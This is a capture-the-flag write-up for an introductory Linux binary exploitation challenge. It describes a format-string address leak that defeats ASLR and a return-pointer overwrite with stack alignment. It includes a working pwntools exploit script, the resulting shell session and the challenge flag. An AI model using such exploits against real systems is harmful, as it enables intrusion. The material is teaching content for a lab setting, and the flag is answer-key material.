# Intro to Pwning 1
**Category:** Pwn  
**Difficulty:** Baby  
**Author:** LiveOverflow  

>This is a introductory challenge for exploiting Linux binaries with memory corruptions. Nowodays there are quite a few mitigations that make it not as straight forward as it used to be.
Service running at: hax1.allesctf.net:9100

## Solution
We are given a _program_, its _source code_ and a _dummy flag_. In order to get the flag, we must call the _WINgardium\_leviosa()_ funtion. But we don't know the address of the function beacuse of ASLR. We must leak some address from the program during the _welcome()_ funtion which we can use to change the return pointer to desired funtion. After leaking some values we can calculate the offsets for _WINgardium\_leviosa()_ using gdb. Then we can overwrite the return pointer in the _AAAAAAAA()_ funtion. But we need another thing. This expoit will not work, the program will crash with a segfault and we won'get a shell. The reason is _movaps_. We have to also make the addresses aligned by using another return pointer. I created this exploit using _pwntools_.
```python
from pwn import *
p = remote("hax1.allesctf.net",9100)
FORMATSTRING = "|".join(["%p" for i in range(0,42)])
MAIN_TO_WIN_OFFSET = 0x135
p.recvuntil("Enter your witch name:")
p.sendline(FORMATSTRING)
LEAKS = p.recvuntil("enter your magic spell:").split("|")
MAIN = int(LEAKS[-4], 16)
log.info("Leaked return value: 0x{:x}".format(MAIN))
WIN = MAIN - MAIN_TO_WIN_OFFSET
RET = WIN+ 0x36
PADDING = "A"*cyclic_find("cnaa")
p.sendline("Expelliarmus\x00"+ PADDING + p64(RET) + p64(WIN))
p.interactive()
```
Runnning this exploit, we get the shell and the flag.
```bash
$python pwnsolve.py 
[+] Opening connection to hax1.allesctf.net on port 9100: Done
[*] Leaked return value: 0x560390b17b21
[*] Switching to interactive mode

~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ ls
flag
pwn1
ynetd
$ cat flag
CSCG{NOW_PRACTICE_MORE}$ exit
[*] Got EOF while reading in interactive
$  
[1]+  Stopped                 python pwnsolve.py
```
### CSCG{NOW\_PRACTICE\_MORE}
